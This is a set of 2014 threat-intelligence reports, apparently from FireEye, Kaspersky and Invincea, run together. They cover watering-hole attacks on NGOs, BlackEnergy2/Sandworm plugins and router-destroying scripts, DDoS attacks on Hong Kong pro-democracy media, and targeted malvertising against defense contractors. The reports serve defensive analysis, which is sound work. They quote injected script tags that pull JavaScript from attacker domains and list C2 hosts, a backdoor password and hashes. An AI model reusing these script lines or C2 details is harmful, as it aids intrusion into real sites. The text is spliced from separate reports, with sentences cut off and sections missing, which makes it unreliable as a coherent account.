This versioning info attempted to masquerade as a Google Chrome file.However, the malware author
misspelled multiple words when attempting to put in versioning information for this particular build.The Poison Ivy implant had the following configuration properties:
C2: quakegoogle.servequake.com, Port: 80
Password: qeTGd3485fF
Mutex: )!VoqA.I4

The C2 domain quakegoogle.servequake[.]com resolved to 115.126.62.100 at the time of the SWCs.Other
domains resolving to the same IP include the following:

 assign.ddnsking.com
 quakegoogle.servequake.com
 picsgoogle.servepics.com

Figure 3: Domains observed resolving to 115.126.62.100

Between August 30, 2014 and September 16, 2014 we also observed SOGU (aka Kaba) callback traffic sent
to assign.ddnsking.com over port 443.Links to the Sunshop Digital Quartermaster

The Poison Ivy backdoor also had a RT_MANIFEST PE resource with a SHA256 fingerprint of
82a98c88d3dd57a6ebc0fe7167a86875ed52ebddc6374ad640407efec01b1393.This same RT_MANIFEST resource was documented in our previous Sunshop Digital Quartermaster
report.FireEye previously identified this specific RT_MANIFEST as the ‘Sunshop Manifest,’ and we have
observed this same manifest resource used in 86 other samples.As we stated in the Quartermaster report,
we believe this shared resource is an artifact of a builder toolkit made available to a number of China-
based APT groups.Conclusion

This activity represents a new SWC campaign.We suspect threat actors are leveraging their access to
compromised websites belonging to NGOs and non-profits to target other organizations in the same
industries.These websites are often visited by organization employees and other organizations in the same
industries, allowing threat actors to move laterally within already compromised networks or gain access to
new networks.While FireEye has not attributed this activity to a specific threat group, we frequently
observe China-based threat actors target non-profits and NGOs, and we suspect that they seek to monitor
activity within their borders that may lead to domestic unrest or embarrass the Chinese government.For
example, in 2013, FireEye observed China-based threat actors steal grant applications and activity reports
specifically related to an international NGO’s China-based activities.We suspects threat actors sought to
monitor these programs and involved individuals.The three organizations whose websites are hosting the
malicious iframes have China-based operations.FireEye is releasing information on this campaign to allow organizations to investigate and prepare for
this activity in their networks.We believe non-profits and NGOs remain at elevated risk of intrusion and
should be especially wary of attempts to compromise their networks using SWC.Threat actors may use
SWCs to achieve this goal, but FireEye does not discount the possibility that threat actors will use other
means at their disposal, including phishing.Based on past threat actor activity in this industry, FireEye
expects threat actors are motivated to steal programmatic data and monitor organizations’ programs in
specific countries.If China-based threat actors are behind the observed campaign, FireEye expects that
organizations with operations in China are high-priority targets.FireEye currently has detection measures
in place that should allow users of FireEye products to detect this SWC activity.It is also likely that other
industries or organizations were affected by this SWC activity, since these sites are public facing and
frequently visited.Special thanks to Google’s Billy Leonard for providing additional information and research.Thanks to the following authors for their contributions: Mike Oppenheim, Ned Moran, and Steve Stone.This entry was posted in Threat Intelligence, Threat Research by Sarah Engle and Ben Withnell.Bookmark the permalink.BE2 Custom Plugins, Router Abuse, and Target Profiles

The BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations
lightly documented over the past year.An even more interesting part of the BlackEnergy story is the
relatively unknown custom plugin capabilities to attack ARM and MIPS platforms, scripts for Cisco
network devices, destructive plugins, a certificate stealer and more.Here, we present available data - it is
difficult to collect on this APT.We will also present more details on targets previously unavailable and
present related victim profile data.These attackers are careful to hide and defend their long-term presence within compromised
environments.The malware's previously undescribed breadth means attackers present new technical
challenges in unusual environments, including SCADA networks.Challenges, like mitigating the attackers'
lateral movement across compromised network routers, may take an organization's defenders far beyond
their standard routine and out of their comfort zone.Brief History

BlackEnergy2 and BlackEnergy3 are known tools.Initially, cybercriminals used BlackEnergy custom
plugins for launching DDoS attacks.There are no indications of how many groups possess this tool.BlackEnergy2 was eventually seen downloading more crimeware plugins - a custom spam plugin and a
banking information stealer custom plugin.Over time, BlackEnergy2 was assumed into the toolset of the
BE2/Sandworm actor.While another crimeware group continues to use BlackEnergy to launch DDoS
attacks, the BE2 APT appears to have used this tool exclusively throughout 2014 at victim sites and
included custom plugins and scripts of their own.To be clear, our name for this actor has been the BE2
APT, while it has been called "Sandworm Team" also.The Plugins and Config Files

Before evidence of BlackEnergy2 use in targeted attacks was uncovered, we tracked strange activity on one
of the BlackEnergy CnC servers in 2013.This strangeness was related to values listed in
newer BlackEnergy configuration files.As described in Dmitry's 2010 Black DDoS' analysis, a
configuration file is downloaded from the server by main.dll on an infected system.The config file
provides download instructions for the loader.It also instructs the loader to pass certain commands to the
plugins.In this particular case in 2013, the config file included an unknown plugin set, aside from the
usual 'ddos' plugin listing.Displayed below are these new, xml formatted plugin names "weap_hwi", "ps",
and "vsnet" in a BlackEnergy configuration file download from a c2 server.This new module push must
have been among the first for this group, because all of the module versions were listed as "version 1",
including the ddos plugin:

Config downloaded from BE2 server

The 'ps' plugin turned out to be password stealer.The 'vsnet' plugin was intended to spread and launch a
payload (BlackEnergy2 dropper itself at the moment) in the local network by using PsExec, as well as
gaining primary information on the user's computer and network.Most surprising was the 'weap_hwi'
plugin.It was a ddos tool compiled to run on ARM systems:

Weap_hwi plugin

At first, we didn't know whether the ARM plugin was listed intentionally or by mistake, so we proceeded to
collect the CnC's config files.After pulling multiple config files, we confirmed that this ARM object
inclusion was not a one-off mistake.The server definitely delivered config files not only for Windows, but
also for the ARM/MIPS platform.Though unusual, the ARM module was delivered by the same server and
it processed the same config file.Linux plugins

Over time we were able to collect several plugins as well as the main module for ARM and MIPS
architectures.All of these ARM/MIPS object files were compiled from the same source and later pushed
out in one config: "weap_msl", "weap_mps", "nm_hwi", "nm_mps", "weap_hwi", and "nm_msl".It's
interesting that the BE2 developers upgraded the ddos plugin to version 2, along with the nm_hwi,
nm_mps, and nm_msl plugins.They simultaneously released version 5 of the weap_msl, weap_mps, and
weap_hmi plugins.The hook main module contained encrypted strings and handled all the function calls and
strings as the references in a large structure.This structure obfuscation may be a rewrite effort to better
modularize the code, but could also be intended to complicate analysis.Regardless, it is likely that
different individuals coded the different plugins.So, the BE2 effort must have its own small team of plugin
and multiplatform developers.During an extended period, we were able to collect many Windows plugins from different CnC servers,
without ever noticing Linux plugins being downloaded as described above.It appears the BE2/SandWorm
gang protected their servers by keeping their non-Windows hacker tools and plugins in separate servers or
server folders.Finally, each CnC server hosts a different set of plugins, meaning that each server works
with different victims and uses plugins based on its current needs.For example, we have yet to obtain the router
access plugin, but we are confident that it exists.Evidence also supports the hypothesis that there is a
decryption plugin for victim files (see below).Our current collection represents the BE2 attackers' capabilities quite well.Some plugins
remain mysterious and their purpose is not yet clear, like 'usb' and 'bios'.Why would the attackers need
information on usb and bios characteristics?It suggests that based on a specific USB and BIOS devices,
the attackers may upload specific plugins to carry out additional actions.Perhaps destructive, perhaps to
further infect devices.We don't know yet.It's also interesting to point out another plugin – 'grc'.In some of the BE2 configuration files, we can
notice an value with a "gid" type:

The addr number in the config

This number is an ID for the plus.google.com service and is used by the 'grc' plugin to parse html.It then
downloads and decrypts a PNG file.The decrypted PNG is supposed to contain a new CNC address, but we
never observed one.We are aware of two related GooglePlus IDs.The first one,
plus.google.com/115125387226417117030/, contains an abnormal number of views.At the time of writing,
the count is 75 million:

BE2 plus profile

The second one - plus.google.com/116769597454024178039/posts - is currently more modest at a little
over 5,000 views.All of that account's posts are deleted.Tracked Commands

During observation of the described above "router-PC" CnC we tracked the following commands delivered
in the config file before the server went offline.We want to pay special attention to the DDoS commands meant for these routers.188.128.123.52
belongs to the Russian Ministry of Defense and 212.175.109.10 belongs to the Turkish Ministry of
Interior's government site.While many researchers suspect a Russian actor is behind BE2, judging by
their tracked activities and the victim profiles, it's still unclear whose interests they represent.While observing some other CnCs and pulling down config files, we stumbled upon some strange mistakes
and mis-typing.They are highlighted in the image below:

BE2 config file mistakes

First, these mistakes suggest that the BE2 attackers manually edit these config files.Secondly, it shows
that even skilled hackers make mistakes.Hard-Coded Command and Control

The contents of the config files themselves are fairly interesting.They all contain a callback c2 with a
hardcoded ip address, some contain timeouts, and some contain the commands listed above.And, according to the collected config files, the
group upgraded their malware communications from plain text http to encrypted https in October 2013.BE2 Targets and Victims

BlackEnergy2 victims are widely distributed geographically.We identified BlackEnergy2 targets and
victims in the following countries starting in late 2013.There are likely more victims.Interesting BE2 incidents
are presented here.Victim #1

The BE2 attackers successfully spearphished an organization with an exploit for which there is no current
CVE, and a metasploit module has been available This email message contained a ZIP archive with EXE
file inside that did not appear to be an executable.This crafted zip archive exploited a WinRAR flaw that
makes files in zip archives appear to have a different name and file extension.BE2 spearphish example

The attached exe file turned out to be 'BlackEnergy-like' malware, which researchers already dubbed
'BlackEnergy3' - the gang uses it along with BlackEnergy2.Kaspersky Lab detects 'BlackEnergy3' malware
as Backdoor.Win32.Fonten – naming it after its dropped file "FONTCACHE.DAT"

When investigating computers in the company's network, only BE2 associated files were found, suggesting
BE3 was used as only a first-stage tool on this network.The config files within BE2 contained the settings
of the company's internal web proxy:

BE2 config file contains victim's internal proxy

As the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system (not seen in
older versions – all plugins were only in-memory), the administrators were able to collect BE2 files from
the infected machines.After decrypting these files, we could retrieve plugins launched on infected
machines: ps, vsnet, fs, ss, dstr.By all appearances, the attackers pushed the 'dstr' module when they
understood that they were revealed, and wanted to hide their presence on the machines.Some machines
already launched the plugin, lost their data and became unbootable.Desstructive dstr command in BE2 config file

Also, on some machines, documents were encrypted, but no related plugin could be found.Victim #2

The second organization was hacked via the first victim's stolen VPN credentials.After the second
organization was notified about the infection they started an internal investigation.They confirmed that
some data was destroyed on their machines, so the BE2 attackers have exhibited some level of destructive
activity.And, they revealed that their Cisco routers with different IOS versions were hacked.They weren't
able to connect to the routers any more by telnet and found the following "farewell" tcl scripts in the
router's file system:

Ciscoapi.tcl – contains various wrappers over cisco EXEC-commands as described in the comments.The comment includes a punchy message for "kasperRsky":

BE2 ciscoapi.tcl fragment

Killint.tcl – uses Ciscoapi.tcl, implements destroying functions:

BE2 killint.tcl fragment

The script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files.The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang
deleted them, and unfortunately couldn't restore them after they were deleted.The BE2 actor performs
careful, professional activity covering their tracks:

ciscoapi.tcl
killint.tcl
telnetapi2.tcl
telnetu.tcl
stub.tcl
stub1.tcl

There is evidence that the logs produced by some scripts were also stored on the FTP server, in particular

the information on CDP neighbors which is provided by one of the procedures of ciscoapi.tcl.Victim #3

The third organization got compromised by the same type of attack as the first one (an EXE file spoofing a
doc within a Zip archive).All the plugins discovered in BE2 files were known, and there was no revelation
of hacked network devices on their side and no destroyed data.The noticeable thing is that many
computers contained both BE2 and BE3 files and some config files contained the following URL:

hxxps://46.165.222(dot)28/upgrade/f3395cd54cf857ddf8f2056768ff49ae/getcfg.php

The URL contains the md5 of the string 'router'.One of the discovered config files contained a URL with
an as yet unidentified md5:

hxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php

Victim set #4

A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible
for downloading and executing BlackEnergy.Starting in March 2014 and ending in July 2014, Siemens
"ccprojectmgr.exe" downloaded and executed a handful of different payloads hosted
at 94.185.85.122/favicon.ico.They are all detected as variants of "Backdoor.Win32.Blakken".Build IDs

Each config file within BE2 main.dll has a field called build_id which identifies the malware version for
the operators.Currently this particular BE/SandWorm gang uses a certain pattern for the build ids
containing three hex numbers and three letters, as follows:

0C0703hji

The numbers indicate the date of file creation in the format: Year-Month-Day.Still, the purpose of the
letters is unknown, but most likely it indicates the targets.The hex numbers weren't used all the time,
sometimes we observed decimal numbers:

100914_mg

100929nrT

Most interesting for us was the earliest build id we could find.Currently it is "OB020Ad0V", meaning that
the BE2/SandWorm APT started operating as early as the beginning of 2010.Appendix: IoC

While BE dropper installs its driver under a randomly picked non-used Windows driver name, like
%system32%\drivers\AliIde.sys.The driver is self-signed on 64-bit systems

However, new "APT" BE2 uses one of the following filenames that are used as an encrypted storage for
plugins and the network settings.Operation Poisoned Handover: Unveiling Ties Between APT Activity
in Hong Kong’s Pro-Democracy Movement
As the pro-democracy movement in Hong Kong has continued, we’ve been watching for indications of
confrontation taking place in cyberspace.Protests began in September and have continued to escalate.In recent weeks, attackers have launched a series of Distributed Denial of Service attacks (DDoS) against
websites promoting democracy in Hong Kong.According to the Wall Street Journal, websites belonging to
Next Media’s Apple Daily publication have suffered from an ongoing DDoS attack that “brought down its
email system for hours”.According to other reports, Next Media’s network has suffered a “total failure” as
a result of these attacks.Additionally, at least one member of the popular online forum HKGolden was
arrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement.The use of DDoS attacks as a political tool during times of conflict is not new; patriotic hacktivist groups
frequently use them as a means to stifle political activity of which they disapprove.The question of state
sponsorship (or at least tacit approval) in online crackdowns is often up for debate and ambiguous from a
technical evidence and tradecraft perspective.In this case, however, we’ve discovered an overlap in the tools and infrastructure used by China-based
advanced persistent threat (APT) actors and the DDoS attack activity.We believe that these DDoS attacks
are linked to previously observed APT activity, including Operation Poisoned Hurricane.This correlation
sheds light on the potential relationships, symbiosis and tool sharing between patriotic hacker activities
designed to disrupt anti-government activists in China, and the APT activity we consistently see that is
more IP theft and espionage-focused.Ongoing DDoS Attacks Target the Pro-Democracy Movement

FireEye has identified a number of binaries coded to receive instructions from a set of command and
control (C2) servers instructing participating bots to attack Next Media-owned websites and the
HKGolden forum.Next Media is a large media company in Hong Kong and the HkGolden forum has been
used as a platform to organize pro-democracy protests.Each sample we identified is signed with digital
certificates that have also been used by APT actors to sign binaries in previous intrusion operations:
These binaries are W32 Cabinet self-extracting files that drop a variant of an older DDoS tool known as
KernelBot .All of the samples we identified have the “NewVersion” value of 20140926.Structurally, all of
these samples are similar in that they drop three files:

•          ctfmon.exe-a legitimate, signed copy of the Pidgin IM client
           (md5 hash = 1685f978149d7ba8e039af9a4d5803c7)
•          libssp-0.dll–malware DLL which is side-loaded by ctfmon.exe
           to decode and launch KernelBot.Most versions of this dll are also
           signed by either the QTI or CallTogether certificate.•          readme.txt – a binary file which contains the XOR-encoded
           KernelBot DLL as well as C2 destination information (most have
           md5 hash of b5ac964a74091d54e091e68cecd5b532)

The KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the
sample.For example, c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to
both www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com.The full list of C2 servers we
identified is as follows:

sapporo-digital-photoclub[.]com
wakayamasatei[.]com
tommo[.]jp
mizma.co[.]jp
sp.you-maga[.]com
nitori-tour[.]com
ninekobe[.]com
shinzenho[.]jp
wizapply[.]com
www.credo-biz[.]com

On Oct. 21, the control server at wakayamasatei[.At this point,
a simple base64 and XOR decode will reveal the plaintext configuration.The following snippet of python
code can be used to decode this command:

b64encoded = request.content.rstrip('@$@').lstrip('@$@')
b64decoded = b64encoded.decode("base64")


command = ""


for c in b64decoded:
           x = ord(c)
           x = x ^ XOR_key
           command += chr(x)
FireEye has observed two different single-byte XOR keys used to encode configuration files issued by the
DDOS C2 servers in this campaign.The two different keys are 0x2A or 0x7E.These configurations issued commands to attack the following domains and
IPs:

nxapi.appledaily.com[.]hk
202.85.162.90
58.64.139.10
202.85.162.97
202.85.162.81
198.41.222.6
202.85.162.101
202.85.162.95
202.85.162.180
202.85.162.140
202.85.162.130
124.217.214.149

All of the above IPs host Next Media or Apple daily websites, with the exception of 58.64.139.10 and
124.217.214.149.The IP 58.64.139.10 has hosted hkgolden[.]com – the domain for the HKGolden forum
mentioned above.For approximately 14 hours between October 23rd and 24th, the attackers pushed a configuration update
to four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic.The IP 124.217.214.149 hosted the attacker controlled domain p.java-sec[.]com.On Oct. 23, 2014, two of the active controls began instructing participating bots to cease attacks.By Oct.
24, 2014, all five of the known active control servers were issuing commands to cease the attacks.It should come as no surprise that hkgolden[.]com, nextmedia[.]com, and appledaily.com[.]hk websites
are now or previously have been blocked by the Great Firewall of China – indicating that the PRC has
found the content hosted on these sites objectionable.Links to Previous Activity

The most direct connection between these DDoS attacks and previous APT activity is the use of the QTI
International and CallTogether code signing certificates, which we have seen in malware attributed to APT
activity.The QTI International digital certificate has been previously used to sign binaries used in APT activity
including Operation Poisoned Hurricane.Specifically, 17bc9d2a640da75db6cbb66e5898feb1 is a PlugX
variant signed by the QTI International certificate.This PlugX variant connected to a Google Code project
at code.google[.]com/p/udom/, where it decoded a command that configured its C2 server.The sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as
well.This sample was first observed during a drive-by attack in June 2014, and was downloaded from
java-se[.]com/jp.jpg.This sample is detected as Backdoor.APT.Preshin and connected to luxscena[.]com
for C2.The QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed.We detect
this payload as Backdoor.APT.PISCES and it used hk.java-se[.]com for C2.The java-se[.]com website was
previously used in other attacks targeting the pro-democracy movement in Hong Kong.We first observed
the presence of malicious javascript inserted into Hong Kong Association for Democracy and People’s
Livelihood on June 26, 2014, which appeared as the following:

<a href="http://www.adpl.org.hk/?p=2680" title="抗議九巴加價要求凍結加價、改善服務
<script language=javascript src=http://java-se.com/o.js></script>">



More recently, as noted by Claudio Guarnieri, the website of the Democratic Party of Hong Kong was
seen hosting a redirect to the same malicious javascript.The CallTogether certificate has been used to sign ecf21054ab515946a812d1aa5c408ca5.We also detect
this payload as Backdoor.APT.PISCES and observed it connect to u.java-se[.]com.]com website.As noted above, this site has been targeted with a DDoS attack by a KernelBot network.We also found that
the hkgolden[.]com website was compromised on Sept. 5, 2014 and had a redirect to a malicious javascript
again hosted at another jave-se[.]com host, which appeared as follows:

document.write("<script language=javascript src=http://jre76.java-
se.com/js/rss.js></script>

Finally, as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec[.]com between Oct.
25, 2014 and Oct. 27, 2014.As Brandon Dixon noted here, the java-sec[.]com domain is linked to the java-
se[.]com by shared hosting history at the following IP address:

124.248.237.26
223.29.248.9
211.233.89.182
112.175.143.2
112.175.143.9
It is unclear why these actors would attack an IP address they were actively using.It’s possible that the
attackers wanted to test their botnet’s capability by attacking an IP they were using to gather statistics on
the size of the attack.It is also possible that the attackers simply made a mistake and accidentally issued
commands to attack their own infrastructure.On Oct. 24, 2014, after attacking their own infrastructure,
the attackers issued new instructions to their botnet that ceased all attacks.Conclusion

While not conclusive, the evidence presented above shows a link between confirmed APT
activity and ongoing DDoS attacks that appear to be designed to silence the Pro Democracy
movement in Hong Kong.The evidence does not conclusively prove that the same actors responsible
for the DDoS attacks are also behind the observed intrusion activity discussed above – such as Operation
Poisoned Hurricane.Rather, the evidence may indicate that a common quartermaster supports
both the DDoS attacks and ongoing intrusion activity.In either scenario, there is a clear connection between the intrusion activity documented in Operation
Poisoned Hurricane and the DDOS attacks documented here.While the tactics of these activities are very
different from a technical perspective, each supports distinct political objectives.Operation Poisoned
Hurricane’s objective appeared to have in part been IP theft possibly for economic gain or other
competitive advantages.In the DDOS attacks, the objective was to silence free speech and suppress the
pro democracy movement in Hong Kong.The Chinese government is the entity most likely to be
interested in achieving both of these objectives.APPENDIX

MD5s

c3d6450075d618b1edba17ee723eb3ca
d08e038d318b94764d199d7a85047637
84bd0809b1dbc2dc86f30d30faaa7e4e
39bb90140fc0101f49377b6c60076f9d
caa5529010c17b969da01ade084794c6
17bc9d2a640da75db6cbb66e5898feb1
0b54ae49fd5a841970b98a078968cb6b
e2a4b96cce9de4fb126cfd5f5c73c3ed
ecf21054ab515946a812d1aa5c408ca5

HOSTNAMES
tommo[.]jp
mizma.co[.]jp
sp.you-maga[.]com
nitori-tour[.]com
ninekobe[.]com
shinzenho[.]jp
wizapply[.]com
www.credo-biz[.]com
www.sapporo-digital-photoclub[.]com
wakayamasatei[.]com
luxscena[.]com
java-se[.]com
hk.java-se[.]com
u.java-se[.]com
jre76.java-se[.]com
p.java-sec[.]com

This entry was posted in Threat Intelligence, Threat Research and tagged advanced malware,
Cybersecurity, malware, zero-day by Ned Moran, Mike Oppenheim and Mike Scott.Bookmark the
permalink.Within the last six months, Invincea has discovered and stopped targeted
malvertizing attacks against specific companies -- particularly those in the Defense Industrial Base.The
combination of traditional cyber crime methods (malvertising) with targeted attacks against Defense
industrials for theft of IP represents another development in the on-going blending of techniques from
cyber crime and advanced threat actors with nation state agendas.We are tracking an on-going campaign
against US Defense companies under the code name Operation DeathClick.Traditional malvertizing has been an effective but indiscriminate method cyber crime gangs use to
compromise endpoints to perpetrate ad fraud, identity fraud, and banking credential theft.In this new
targeted variation of malvertizing, the perpetrators are attacking specific organizations by leveraging real-
time ad bidding networks and micro-targeting techniques developed over the last decade in online
advertising.The objective of these micro-targeted attacks against the Defense sector is likely theft of
Intellectual Property more than ad fraud and indicates motive and sophistication characteristic of
advanced threat actors.Since these attacks were blocked by Invincea prior to compromise of the machine
or network, we cannot confirm the specific IP the perpetrators are after – only the Tactics, Techniques,
and Protocols (TTPs) used which we describe herein, similar to methods used to provide backdoor access
and command and control over compromised networks.While we discovered these attacks across multiple Defense companies, we expect it will not be long, if
not already, before other highly targeted segments including Federal, Financial Services, Manufacturing,
and HealthCare are victimized with the same micro-targeted malvertising.The campaign described here
does not represent a single flaw, 0-day, or unpatched bug, but rather a significant development in the
adversary’s capabilities and strategy to leverage legitimate online advertising platforms on well-known ad
supported websites via a technique called Real-Time Ad Bidding.In other words, this problem will not be
patched on Tuesday.UPDATE: We have updated this document to include a new section on a campaign of distributing
CryptoWall ransomware via malvertising.While the attack vector is the same, we believe this to be
motivated by cybercrime rather than theft of IP from Defense companies.Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                   Invincea White Paper       3



Introduction


Malvertising has seen meteoric rise in 2014.Threat actors create a corporate front, advertise on
commonly visited sites, then later switch out the landing pages for their ads to pages that host exploit
kits, or simply create a temporary redirection from their usual content to the malicious landing page.These exploit kits are hosted on compromised web servers across the world.In other words, they leverage
legitimate ad-supported popular websites together with compromised websites for hosting exploit
landing pages, defeating black-listing techniques.The lifetime of these ads and landing pages are
measured in hours.In the campaign described here, Operation DeathClick, traditional malvertising has been armed with a
micro-targeting system using IP address ranges, geographically narrowed down to zip codes, and interests
of the user (recorded in cookies) to target specific companies, company types, and user
interests/preferences.They are employing the tactics of real-time ad bidding to guarantee malicious ad
delivery to intended targets of the campaign – building on a decade of work in real-time analytics for
online ad placement, but for nefarious purposes.The threat actors redirect their ads for just minutes at a time and then abandon their exploit kit pages
forever.This means that list-based threat intelligence feeds are rendered ineffective.The domains used
do not appear in any proxy blacklist, and the malware droppers delivered by the exploit pages always
employ different signatures, evading traditional network and endpoint detection technology.Ad delivery networks today are not incentivized to address the problem in a credible manner as they
derive revenue from the criminal enterprise, while not being held accountable.Turning a blind eye to the
problem is rewarded economically.Meanwhile the perpetrators are able to use traditional malvertising
and ad fraud bots to fund the criminal enterprise.Without cooperation of ad networks to vet the advertisers working through front companies, this attack
vector will go unchecked.For example, oppressive regimes trying to gather intelligence on activist
protests can deliver ads to people getting email from within a specific locality where they are protesting.Today, it is commonplace for micro-targeting techniques to be used as part of the toolset in legitimate
online advertising.For instance, a defense contractor, trying to win a new omnibus contract, can deliver
targeted ads to online news sites frequented by Government program personnel.The latest software
product release can be delivered to Windows users visiting PC Magazine’s website.A local car dealership
can sense when someone is in the market for a new car and can deliver advertising to those users, based
solely on browsing history.Now advanced threat actors are able to target an organization directly via micro-targeted malvertising,
based solely on their corporate network IP range.Thus, it doesn’t matter where in the world you point
your web browser -- an online video poker room, a fantasy football club homepage, a Pakistani news
homepage, or even checking your own webmail at a trusted email provider.Those ad windows can and
are being used to deliver malware if the bidding price is right.Operation DeathClick: Targeting the US Industrial Base


Recently, multiple US Defense/Aerospace contractors were targeted by a malvertising campaign.These
contractors had deployed world-class enterprise security defense in depth approaches to protect their
intellectual property.They had next generation firewalls that relied on threat intelligence feeds to do
auto-blocking of known malicious sites.They had malware interception technology that relied on known
bad hashes to prevent malicious downloads.The multiple proxies in place subscribed to real time feeds
of known bad URLs.They deployed AV at the gateways and on the endpoints.But in a two week period, these organizations were hit with dozens of micro-targeted malvertising attacks,
each of which would have provided a beachhead for the threat actors from which to compromise the
network, if successful.In each instance, the attacks were carried out by targeting these Defense
contractors directly via real-time ad bidding.Once targeted, an end user only needed to browse to any
website, anywhere in the world, which contained a DoubleClick ad-partner embedded window.Invincea
stopped these attacks on the endpoints by containing the delivered exploits in secure virtual containers,
while producing the forensics that led to this discovery.Next we go in some detail about example attacks perpetrated against the defense firms.It is important to note that the websites we show next that served up targeted malvertising were victims
of malvertising campaigns with no knowledge of the malicious ads they were serving up.These malicious
ads were served up by 3rd party networks, who are unwittingly sourcing malicious content.As we will
discuss later, the 3rd party ad networks themselves are falling victim to malicious content campaigns.Summary for Incident at Fleaflicker.com


Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                  Invincea White Paper       5


A user visited his online fantasy football league homepage at Fleaflicker.com.As soon as the page loaded,
a malicious ad delivered a backdoor Trojan via a Java-based exploit.Figure 1 shows a screenshot of the page that was visited.You will notice the two inline ad placements
for DoubleClick ad delivery.The malware delivered came from a compromised Polish website, and
would have installed a generic backdoor Trojan.Figure 1: Fleaflicker.com website

Note the prominent ad placements by AdChoice, a DoubleClick affiliate.Figure 2 shows an event tree of
the exploit and malware delivered from an ad by visiting Fleaflicker.com.In this instance, the Pubmatic server redirected to a Web
server in Poland that dropped the malware.The timeline below shows the exact times and URLs visited.Figure 3: Timeline for Fleaflicker.com Incident

Note the number of re-directs from Fleaflicker.com to different outside properties in Figure 3.Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                     Invincea White Paper       7




Figure 4: Process Launch for Malware fvJcrgR0.exe from Fleaflicker.com Incident

Invincea Threat Management provides a quick way to search for an MD5 hash on third party sites (see
Figure 4).Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                    Invincea White Paper       9




Summary for Incident at Gpokr.com


An employee at a defense contractor visited a free Texas Poker online game.The Poker site had
advertisements on the page, one of which launched a similar attack as seen in before on other websites
visited by employees at this firm.Figure 6: Screenshot of Gpokr.com



It should be noted that Gpokr.com no longer appears to be serving advertisements from their site.At the
time of the incident, as seen in the logs below, an ad window was previously present.In the event tree
shown in Figure 7, you will see that the winning bid redirected to a direct-to-IP site instead of a site via
domain name.Also, above is the first indication of specific executable DLL files.Searches for these
filenames returned zero results on VirusTotal.Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                   Invincea White Paper       10




                                   Figure 7: Event Tree for Gpokr.com

This event on September 14 (Figure 8) shows that delivery.first-impression.com redirected directly to an
IP address, not a domain name to deliver its malicious payload.Note the multiple DLL files written to disk
and the spawning of rundll32.exe.At this point, the Invincea-protected host recognized the unauthorized
process and reverted itself to a clean state.Figure 8: Timeline View for Event 5 – Gpokr.com




Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                    Invincea White Paper       11



Summary for Webmail.earthlink.net


In another incident an employee checked their online Earthlink account.When they replied to an email,
a new ad was loaded on a page that attempted to exploit Java.This malvertising was from the same IP
address seen in other incidents.Figure 9: Screenshot of Webmail.earthlink.net

You will notice the inline advertisements on this page in Figure 9.The event tree in Figure 10 notes that
this was likely a spear-phish attack.The timeline will show that when the user replied to an email, the ads
on the Earthlink page refreshed, dropping the exploit code via Java.Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                  Invincea White Paper    12




                      Figure 10: Event Tree for Incident 6 Webmail.earthlink.net



Note in the timeline in Figure 11, how there was a 7 minute gap between the DoubleClick ad redirect and
the delivery.first-impression.com ad.This is an indication that the page was refreshed or the ad was
refreshed on the page.The same exploit IP address from the Gpokr event is present.This event is the
oldest, happening on September 11.Figure 11: Timeline for Incident 6 Webmail.earthlink.net




Invincea, Inc.                                                         Release Date: 10.27.2014
                                                                                    Invincea White Paper       13



Summary of Incidents in Operation DeathClick


The three examples above are samples of the more than two dozen micro-targeted attacks we have
witnessed and blocked as part of Operation DeathClick since mid-September.Defense Industrial Base
customers witnessed micro-targeted malvertising at a rate six times that of comparable private sector
companies with similar defense-in-depth capabilities.Real-Time Bidding Networks: How it works

We observed in Operation DeathClick that real-time ad bidding networks are being used by criminal
enterprise to target companies with malicious content in order to gain persistent remote access.In
these third-party arrangements, the content is frequently not vetted because billions of impressions are
rendered in real-time.Most of the content is legitimate ads.A small fraction is malicious content linking
to landing pages that infect users.Real-time ad networks are being used, often unwittingly, and some
have taken steps to try and combat malicious use of their networks.The Online Trust Alliance is one such
industry group comprised of major software companies and ad networks working together to try and
address this problem.Our goal in this paper is to shed light on the micro-targeting of companies by
criminal enterprise employing real-time ad networks, and to aid the industry in collectively addressing
this problem.Real-time ad bidding networks have evolved over the last ten years as a means of micro-targeting
customers with advertising content they are more likely to click-on.From Wikipedia:

        Real-time bidding (RTB) refers to the means by which ad inventory is bought and sold on a per-
        impression basis, via programmatic instantaneous auction, similar to financial markets.[1] With
        real-time bidding, advertising buyers bid on an impression and, if the bid is won, the buyer’s ad is
        instantly displayed on the publisher’s site.[2] Real-time bidding lets advertisers manage and
        optimize ads from multiple ad-networks by granting the user access to a multitude of different
        networks, allowing them to create and launch advertising campaigns, prioritize networks and
        allocate advertising stock.Real-time bidding is a dynamic bidding process where each impression is bid for in (near) real time,
        against a static auction where the impressions are typically bundled in groups of 1,000.A typical transaction begins with a user visiting a website.This triggers a bid request that can
        include various pieces of data such as the user’s demographic information, browsing history,
        location, and the page being loaded.The request goes from the publisher to an ad exchange,
        which submits it and the accompanying data to multiple advertisers who automatically submit
        bids in real time to place their ads.Advertisers bid on each ad impression as it is served.The


Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                  Invincea White Paper       14



        impression goes to the highest bidder and their ad is served on the page.This process is repeated
        for every ad slot on the page.Real time bidding transactions typically happen within 100
        milliseconds from the moment the ad exchange received the request.The bidding happens autonomously and advertisers set maximum bids and budgets for an
        advertising campaign.The criteria for bidding on particular types of consumers can be very
